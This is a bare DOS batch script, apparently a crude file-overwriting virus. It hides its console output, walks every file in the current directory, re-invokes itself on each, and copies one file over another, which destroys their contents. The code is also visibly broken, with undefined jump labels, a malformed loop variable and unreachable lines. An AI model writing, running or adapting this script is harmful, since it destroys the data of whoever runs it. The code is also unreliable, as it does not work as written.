   @echo off
   ctty nul
   if "%1"=="" goto w01
   if not "%1"=="" goto w2
   goto w3
   :w01
   ctty nul
   for %%n in (*.*) do call %0 %n
   goto w3
   if not "%toy"== "" goto w02
   set toy=%1
   goto w3
   :w02
   copy %1 %toy
   set toy=%1
   :fin
